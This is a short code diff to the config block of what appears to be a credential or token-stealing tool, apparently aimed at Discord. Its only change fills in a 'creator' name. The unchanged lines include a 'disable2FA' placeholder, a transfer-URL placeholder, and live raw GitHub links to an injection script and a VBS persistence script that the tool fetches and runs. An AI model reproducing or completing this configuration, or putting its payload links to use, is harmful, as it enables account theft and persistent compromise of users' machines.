@@ -19,7 +19,7 @@ var config = {
   "init-notify": "true",
   "embed-color": 3553599,
   disable2FA: "%DISABLE_2FA%",
-  creator: "",
+  creator: "@Nova Sentinel",
   transfer_link: `%TRANSFER_URL%`,
   injection_url: "https://raw.githubusercontent.com/404log/couc/refs/heads/main/index.js",
   injector_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
